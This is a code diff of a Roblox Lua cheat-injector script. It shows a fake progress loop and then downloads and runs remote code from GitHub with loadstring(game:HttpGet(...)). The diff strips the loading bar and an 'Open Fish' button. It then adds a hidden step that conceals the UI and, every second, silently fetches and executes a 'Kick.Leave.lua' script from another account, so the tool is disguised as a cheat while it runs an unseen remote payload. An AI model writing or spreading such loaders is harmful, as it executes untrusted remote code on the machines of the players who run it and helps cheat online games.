@@ -52,62 +52,13 @@ local buttonCorner = Instance.new("UICorner")
 buttonCorner.CornerRadius = UDim.new(0, 6)
 buttonCorner.Parent = injectButton
 
--- Add Hover Effect to Button
+-- Hover Effect for Button
 injectButton.MouseEnter:Connect(function()
     injectButton.BackgroundColor3 = Color3.fromRGB(90, 160, 210)
 end)
 injectButton.MouseLeave:Connect(function()
     injectButton.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
 end)
-
--- Create Loading Bar Frame
-local loadingBarBg = Instance.new("Frame")
-loadingBarBg.Size = UDim2.new(0.8, 0, 0.1, 0)
-loadingBarBg.Position = UDim2.new(0.1, 0, 0.85, 0)
-loadingBarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-loadingBarBg.BorderSizePixel = 0
-loadingBarBg.Parent = mainFrame
-
--- Add Rounded Corners to Loading Bar
-local loadingBarCorner = Instance.new("UICorner")
-loadingBarCorner.CornerRadius = UDim.new(0, 6)
-loadingBarCorner.Parent = loadingBarBg
-
--- Create Inner Loading Bar
-local innerLoadingBar = Instance.new("Frame")
-innerLoadingBar.Size = UDim2.new(0, 0, 1, 0)
-innerLoadingBar.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
-innerLoadingBar.BorderSizePixel = 0
-innerLoadingBar.Parent = loadingBarBg
-
--- Create Progress Label
-local progressLabel = Instance.new("TextLabel")
-progressLabel.Size = UDim2.new(1, 0, 0.3, 0)
-progressLabel.Position = UDim2.new(0, 0, 0.5, 0)
-progressLabel.BackgroundTransparency = 1
-progressLabel.Text = "0%"
-progressLabel.TextSize = 30
-progressLabel.Font = Enum.Font.GothamBold
-progressLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-progressLabel.Parent = loadingBarBg
-
--- Create "Open Fish" Button (Initially Hidden)
-local fishButton = Instance.new("TextButton")
-fishButton.Size = UDim2.new(0.8, 0, 0.3, 0)
-fishButton.Position = UDim2.new(0.1, 0, 0.5, 0)
-fishButton.Text = "Open Fish"
-fishButton.TextScaled = true
-fishButton.Font = Enum.Font.GothamBold
-fishButton.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
-fishButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-fishButton.BorderSizePixel = 0
-fishButton.Visible = false
-fishButton.Parent = mainFrame
-
--- Add Rounded Corners to Fish Button
-local fishButtonCorner = Instance.new("UICorner")
-fishButtonCorner.CornerRadius = UDim.new(0, 6)
-fishButtonCorner.Parent = fishButton
 
 -- Functions for Injecting
 local function startInjecting()
@@ -116,44 +67,35 @@ local function startInjecting()
     local startTime = tick()
     while tick() - startTime < totalTime do
         local progress = (tick() - startTime) / totalTime
-        innerLoadingBar.Size = UDim2.new(progress, 0, 1, 0)
-        progressLabel.Text = math.floor(progress * 100) .. "%"
         wait(0.1)
     end
 
-    -- After 100% progress, run the main cheat
+    -- After progress completes, load the cheat
     local success, errorMessage = pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/UniDCYT/Dolhin-Tsb-Private-Cheat/refs/heads/main/MainCheat.lua"))()
     end)
 
-    -- Check if the code ran successfully
+    -- Log injection result
     if success then
         print("Injection Complete!")
     else
         print("Error during injection: " .. errorMessage)
     end
 
-    -- Show the "Open Fish" button for 10 seconds
+    -- Hide UI after injection
     injectButton.Visible = false
-    fishButton.Visible = true
+    mainFrame.Visible = false
 
-    local fishButtonClicked = false
-    fishButton.MouseButton1Click:Connect(function()
-        fishButtonClicked = true
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/NYX0HUB/premium/refs/heads/main/main"))()
-    end)
-
-    -- Wait for 10 seconds or until "Open Fish" is clicked
-    local waitTime = 10
-    while waitTime > 0 and not fishButtonClicked do
+    -- Continuously run the external script every second
+    while true do
         wait(1)
-        waitTime = waitTime - 1
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Infernalblight/Dolhin-Tsb-Private-Cheat/refs/heads/main/Kick.Leave.lua"))()
+        end)
     end
-
-    -- Close the UI after 10 seconds or once the fish script is run
-    screenGui.Enabled = false
 end
 
+-- Connect Inject Button
 injectButton.MouseButton1Click:Connect(function()
     startInjecting()
 end)
